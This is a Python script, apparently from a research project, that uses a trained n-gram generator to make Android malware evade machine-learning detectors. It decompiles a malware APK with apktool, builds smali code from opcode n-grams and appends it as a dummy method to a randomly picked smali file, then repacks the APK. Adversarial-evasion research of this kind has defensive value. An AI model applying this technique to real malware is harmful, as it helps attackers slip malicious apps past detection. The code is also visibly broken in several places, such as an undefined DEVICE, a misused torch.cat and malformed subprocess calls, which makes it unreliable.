import os
import subprocess
import random
from opcode_ngram_feature_extract import labeled_data
from torch.utils.data import DataLoader, TensorDataset
from opcode_ngram_model import NgramGenerator
import torch
import numpy as np

SAVED_MODEL_PATH = ''


def gen_code(opcode):
    idx = int(opcode, 16)
    with open('inject_code.txt') as f:
        inject_list = f.read()
    inject_list = inject_list.split('###')
    code = inject_list[idx].split('\n', 1)[1]
    return code


def ngram_to_opcode(ngram):
    # opcodes = {}
    # with open('std_codes.txt') as f:
    #     for line in f:
    #         (key, val) = line.split()
    #         opcodes[val] = key
    final = ''
    # for i in range(0, len(ngram), 2):
    #     print(ngram[i:i + 2])
    for i in range(len(ngram)):
        opcode = ngram[i:i + 1]
        final += gen_code(opcode) + '\n'
    return final


ngram_generator = NgramGenerator()
ngram_generator.load_state_dict(torch.load(SAVED_MODEL_PATH))
ngram_generator.eval()


with open('ngram_features.txt', 'r') as file:
    ngram_features = file.read()
    ngram_features = ngram_features.split('\n')

input_file = ''

filename = os.path.basename(input_file).split('.')[0]
command = f'apktool d -f {input_file} -o {filename}'
subprocess.run(['sh', command])

data_malware = labeled_data(root_dir='temp_file_dir', ngram_features=ngram_features)

labels_malware = data_malware[:, 0]
data_malware = data_malware[:, 1:]

# dataNorm_malware = data_malware / np.max(data_malware)
# dataNorm_malware = 2 * dataNorm_malware - 1

# convert to tensor
data_tensor_malware = torch.tensor(data_malware).float()

noise = np.random.uniform(0, 1, (1, ngram_generator.noise_dims))
malware_noise = torch.cat(data_tensor_malware, noise, 1)

gen_malware = ngram_generator(malware_noise.to(DEVICE)).cpu()
gen_malware = gen_malware[0]

final = {}
for i in range(len(data_tensor_malware)):
    diff = gen_malware - data_tensor_malware[i]
    final[labels_malware[i]] = diff

smali_inject = ''
function_start = '''.method private throw2()V
    .locals 3
    .prologue
    .line 31
'''
function_end = '.end method\n'
for ngrams in final:
    smali_inject += function_start
    smali_inject += ngram_to_opcode(ngrams)
    smali_inject += function_end


smali_dir = 'temp_file_dir/smali'
smali_files = [f for f in os.listdir(smali_dir) if os.path.isfile(os.path.join(smali_dir, f) and f.endswith('.smali'))]
inject_file = random.choice(smali_files)
with open(inject_file, 'a') as file:
    file.write(smali_inject)

command = f'apktool b {filename}'
subprocess.run(['sh', command])
